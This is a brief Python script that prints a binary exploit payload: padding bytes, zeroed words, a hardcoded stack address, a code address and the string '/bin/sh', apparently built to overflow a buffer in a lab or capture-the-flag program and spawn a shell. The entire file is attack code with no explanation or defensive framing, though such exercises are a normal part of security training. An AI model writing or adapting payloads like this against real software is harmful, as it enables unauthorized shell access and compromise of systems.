#!/usr/bin/env python3

import sys
sys.stdout.buffer.write(b'A'*10)

sys.stdout.buffer.write(int(0).to_bytes(8, 'little'))
sys.stdout.buffer.write(int(0).to_bytes(8, 'little'))
sys.stdout.buffer.write(0x7ffffff685b0.to_bytes(8, 'little'))
sys.stdout.buffer.write(b'A'*8)
sys.stdout.buffer.write(0x0000000000455054.to_bytes(8, 'little'))
sys.stdout.buffer.write(b'/bin/sh\x00')

